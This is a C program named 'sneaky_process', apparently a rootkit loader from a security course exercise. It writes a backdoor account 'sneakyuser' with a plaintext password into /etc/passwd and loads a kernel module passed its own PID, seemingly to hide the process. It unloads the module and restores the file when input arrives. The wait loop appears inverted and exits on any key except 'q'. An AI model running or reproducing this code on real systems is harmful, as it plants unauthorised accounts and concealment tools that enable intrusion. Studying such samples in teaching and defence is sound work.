#include <stdio.h>
#include <stdlib.h>
int main() {
    int pid = getpid();
    printf("sneaky_process pid = % d\n", getpid());
    system("cp /etc/passwd /tmp");
    printf("copied /etc/passwd to /tmp/passwd\n");
    system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n' >> /etc/passwd");
    printf("added sneakyuser to /etc/passwd\n");

    char command[50];

    sprintf(command, "insmod sneaky_mod.ko pid=%d", pid);

    system(command);
    char input;
    while (1) {
        if ((input = getchar()) != 'q') {
            break;
        }
    }
    system("rmmod sneaky_mod.ko");
    system("cp /tmp/passwd /etc");

    return EXIT_SUCCESS;
}